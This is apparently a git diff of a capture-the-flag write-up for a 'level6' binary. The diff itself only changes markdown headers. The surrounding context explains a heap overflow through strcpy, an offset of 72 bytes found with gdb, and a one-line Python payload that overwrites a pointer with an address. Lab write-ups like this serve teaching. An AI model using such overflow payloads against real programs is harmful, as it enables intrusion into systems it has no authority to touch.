@@ -27,14 +27,13 @@ By running the executable in `gdb`, breaking after the `malloc`s and running `p/
 
 `0x50 - 0x08 = 0x48 = 72`, so we'll need to write 72 characters after the beginning of `var_one`
 
-# The exploit
+## The exploit
 
 We can do this fairly simply ; any buffer of `76+` characters will force `strcpy` to overwrite `var_two`. We run :
 
 ```
 ./level6 $(python -c 'print("A" * 72 + "\x54\x84\x04\x08")')
 ```
-
 
 ## The flag
 
